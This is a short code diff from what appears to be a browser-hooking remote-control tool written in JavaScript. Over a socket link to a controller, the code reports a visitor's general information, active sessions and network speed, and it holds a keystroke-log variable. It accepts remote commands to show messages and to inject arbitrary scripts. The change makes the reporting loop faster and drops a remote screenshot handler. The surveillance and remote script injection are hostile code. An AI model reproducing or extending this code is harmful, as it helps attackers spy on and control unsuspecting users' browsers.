@@ -13,7 +13,7 @@ async function main () {
     const firstTime = checkFirstTimer()
     const link = window.ORIGINAL
     let keyLog = ''
-    const helpersToLoop = async (seconds = 5) => {
+    const helpersToLoop = async (seconds = 2) => {
         resolveLazyLoadedLinks()
         io.emit('general info', await getGeneralInfo())
         io.emit('detected sessions', await getActiveSessions())
@@ -26,7 +26,6 @@ async function main () {
     io.emit('new guest')
     io.emit('network speed', await getNetworkSpeed())
     helpersToLoop()
-    io.on('take screenshot', async () => io.emit('receive screenshot', await getScreenShot()))
     io.on('say', say)
     io.on('alert', alert)
     io.on('inject', injectScript)
